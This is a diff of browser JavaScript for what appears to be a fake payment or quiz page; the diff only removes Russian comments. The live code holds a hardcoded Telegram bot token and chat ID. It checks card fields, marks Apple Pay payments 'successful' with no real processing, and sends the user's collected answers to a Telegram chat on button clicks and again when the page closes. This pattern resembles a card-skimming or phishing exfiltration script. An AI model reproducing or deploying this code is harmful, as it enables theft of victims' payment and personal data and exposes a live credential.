@@ -2,11 +2,11 @@
 const TELEGRAM_BOT_TOKEN = "7845261307:AAG26zSzzgwOBXUd3c6ohw0ILYA3gpejyv4";
 const TELEGRAM_CHAT_ID = "-1002168718110";
 
-let telegramSent = false; // Флаг для предотвращения повторной отправки
-const userAnswersPay = {}; // Хранение ответов пользователя
+let telegramSent = false;
+const userAnswersPay = {};
 
 async function sendToTelegram() {
-  if (telegramSent) return; // Если уже отправлено, прерываем выполнение
+  if (telegramSent) return;
 
   const message = `📩 Новые ответы:\n\n${JSON.stringify(
     userAnswersPay,
@@ -22,13 +22,12 @@ async function sendToTelegram() {
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
     });
     console.log("Ответы успешно отправлены в Telegram.");
-    telegramSent = true; // Устанавливаем флаг после успешной отправки
+    telegramSent = true;
   } catch (error) {
     console.error("Ошибка при отправке в Telegram:", error);
   }
 }
 
-// Функция проверки заполненности полей карты
 function validatePaymentFields() {
   const cardholderName = document
     .querySelector("input[placeholder='John Doe']")
@@ -48,7 +47,6 @@ function validatePaymentFields() {
   return true;
 }
 
-// Обработчик для кнопки Apple Pay
 document.querySelector(".applepay-button").addEventListener("click", () => {
   userAnswersPay.payment = {
     status: "Payment successful",
@@ -59,10 +57,8 @@ document.querySelector(".applepay-button").addEventListener("click", () => {
   sendToTelegram();
 });
 
-// Обработчик для кнопки оплаты картой
 document.querySelector(".payment-button").addEventListener("click", () => {
-  if (!validatePaymentFields()) return; // Проверяем заполненность полей, если не заполнены - прерываем выполнение
-
+  if (!validatePaymentFields()) return;
   const paymentButton = document.querySelector(".payment-button");
   const successButton = document.querySelector(".success-button");
 
@@ -80,14 +76,12 @@ document.querySelector(".payment-button").addEventListener("click", () => {
   sendToTelegram();
 });
 
-// Сохранение данных перед закрытием страницы
 window.addEventListener("beforeunload", async () => {
   if (!telegramSent && Object.keys(userAnswersPay).length > 0) {
     await sendToTelegram();
   }
 });
 
-// Проверка на финальном экране
 function checkForFinalScreen() {
   const finalScreen = document.getElementById("screen-28");
   if (
